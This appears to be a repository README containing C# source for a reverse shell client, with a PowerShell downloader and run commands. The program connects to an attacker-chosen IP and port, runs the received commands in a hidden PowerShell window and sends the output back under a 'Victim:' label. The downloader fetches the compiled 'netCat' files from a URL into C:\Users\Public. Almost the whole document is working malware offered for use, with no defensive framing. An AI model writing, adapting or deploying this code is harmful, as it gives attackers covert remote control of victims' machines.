## Robert Chaves Perez (r0b0t95) 2023

```C#
namespace cc
{
    public class Program
    {
        public static void Main(string[] args)
        {
            /*
             * Robert Chaves Perez (r0b0t95) 2023
             */

            if (args.Length == 2)
            {
                string serverIp = args[0];
                int port = Convert.ToInt16(args[1]);

                TcpClient client = new TcpClient(serverIp, port);
                NetworkStream stream = client.GetStream();

                Byte[] data = new Byte[4096];

                StringBuilder cmd = new StringBuilder();

                while (true)
                {
                    try
                    {
                        // request from SERVER
                        Int32 bytes = stream.Read(data, 0, data.Length);
                        cmd.Append(Encoding.ASCII.GetString(data, 0, bytes));

                        var cmdOutput = ShellCMD(cmd.ToString());

                        // responce to SERVER
                        data = Encoding.ASCII.GetBytes(cmdOutput);
                        stream.Write(data, 0, data.Length);
                        cmd.Clear();
                    }
                    catch (ArgumentNullException)
                    {
                    }
                    catch (SocketException)
                    {
                    }
                }
            }
        }

        // command shell
        private static string ShellCMD(string cmd)
        {
            StringBuilder sb = new StringBuilder();

            sb.Append("Victim: \n");

            if (cmd.Contains("cd"))
            {
                ChangeDirectory(cmd.Replace("cd", ""));
                sb.Append("Directory changed");
            }
            else
            {
                sb.Append(ExecuteCommands(cmd));
            }

            return sb.ToString();
        }

        // method for execute CMD command prompt command
        private static string ExecuteCommands(string cmd)
        {
            StringBuilder sb = new StringBuilder();
            Process process = new Process();
            ProcessStartInfo startInfo = new ProcessStartInfo();

            try
            {
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "powershell.exe";
                startInfo.Arguments = "/c " + cmd;
                startInfo.UseShellExecute = false;
                process.StartInfo = startInfo;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                sb.Append(process.StandardOutput.ReadToEnd());
                process.WaitForExit();
            }
            catch (Exception ObjectExeption)
            {
                sb.Append(ObjectExeption.Message);
            }

            return sb.ToString();
        }


        // change directory
        private static void ChangeDirectory(string cmd)
        {
            string path = SortPath(cmd);

            try
            {
                Directory.SetCurrentDirectory(path);
            }
            catch (DirectoryNotFoundException) { }
            catch (IOException) { }
        }


        private static string SortPath(string path)
        {
            if (path.Contains(".."))
            {
                string currentPath = Directory.GetCurrentDirectory();

                string newPath = Path.GetDirectoryName(currentPath);

                if (!string.IsNullOrEmpty(newPath))
                {
                    return newPath;
                }

                return path;
            }
            if (path.Contains("C:/root"))
            {
                return @"C:\";
            }
            if (string.Equals(path, "D:/root"))
            {
                return @"D:\";
            }
            if (string.Equals(path, "E:/root"))
            {
                return @"E:\";
            }
            if (string.Equals(path, "F:/root"))
            {
                return @"F:\";
            }
            if (string.Equals(path, "G:/root"))
            {
                return @"G:\";
            }
            if (path.Contains("/"))
            {
                string currentPath = Directory.GetCurrentDirectory();
                return currentPath + path.Replace("/", "\\").Trim();
            }
            else
            {
                return path;
            }
        }


    }
}
```

**DownLoad**

```powershell
<#
Robert Chaves Perez (r0b0t95) 2023
.\invoke-nc.ps1 -url '<url>' 
#>

param(
    [string]$url
)

$files = 'netCat.deps.json', 'netCat.dll', 'netCat.exe', 'netCat.pdb', 'netCat.runtimeconfig.json'


if(-Not [string]::IsNullOrEmpty($url)){

    for ($i = 0; $i -lt $files.Length; ++$i){

        $path = 'C:\Users\Public\' + $files[$i]

        $fileUrl = $url + '/' + $files[$i]

        Write-Host $fileUrl

        Invoke-WebRequest -Uri $fileUrl -Outfile $path
     
    }

}
```

**Execute**

```powershell
.\invoke-nc.ps1 -url '<url>'
```

```powershell
 .\netCat.exe <ipServer> <port>
```
